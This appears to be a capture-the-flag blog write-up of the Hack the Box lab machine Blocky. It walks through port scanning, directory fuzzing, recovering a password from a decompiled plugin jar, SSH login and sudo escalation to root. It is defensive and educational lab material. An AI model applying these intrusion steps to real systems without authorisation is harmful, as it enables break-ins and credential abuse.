---
layout: post
title: Hack the Box - Blocky
date: 2020-05-14 01:04:22 +0100
description: Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector, Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.
img: blocky.png
fig-caption: Blocky
categories: HackTheBox
tags: [Easy, Linux, Retired, CTF]
---
## Overview
Blocky is fairly simple overall, and was based on a real-world machine. It demonstrates the risks of bad password practices as well as exposing internal files on a public facing system. On top of this, it exposes a massive potential attack vector, Minecraft. Tens of thousands of servers exist that are publicly accessible, with the vast majority being set up and configured by young and inexperienced system administrators.
## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/blocky]
└─$ sudo nmap -p- -T4  10.129.1.53
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-15 12:09 GMT
Nmap scan report for 10.129.1.53
Host is up (0.016s latency).
Not shown: 65530 filtered ports
PORT      STATE  SERVICE
21/tcp    open   ftp
22/tcp    open   ssh
80/tcp    open   http
8192/tcp  closed sophos
25565/tcp open   minecraft
```
We can see that a minecraft port is open which is interesting but after following that rabbit hole for a while I ran fuzzing against the webserver and found a plugins directory with a jar in it.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/blocky]
└─$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.129.1.53/FUZZ   

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.1
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.53/FUZZ
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 52253, Words: 3306, Lines: 314]
wiki                    [Status: 301, Size: 309, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 315, Words: 20, Lines: 10]
plugins                 [Status: 301, Size: 312, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 316, Words: 20, Lines: 10]
javascript              [Status: 301, Size: 315, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 313, Words: 20, Lines: 10]
phpmyadmin              [Status: 301, Size: 315, Words: 20, Lines: 10]
                        [Status: 200, Size: 52253, Words: 3306, Lines: 314]
server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
:: Progress: [220547/220547] :: Job [1/1] :: 2402 req/sec :: Duration: [0:01:34] :: Errors: 0 ::
```
## Foothold
Using [jd-gui](https://tools.kali.org/reverse-engineering/jd-gui) I was able to decompile the jar and could see a password. A brief look on the site revealed a username notch. Which when attempting SSH granted access.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/blocky]
└─$ ssh notch@10.129.1.53
notch@10.129.1.53's password: 
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.


Last login: Thu Sep 24 08:12:11 2020 from 10.10.14.2
notch@Blocky:~$
```
## Privilege Escalation
As the user is able to run sudo privilege escalation is trivial.
```
notch@Blocky:/tmp$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:/tmp$ sudo bash
root@Blocky:/tmp# whoami
root
``` 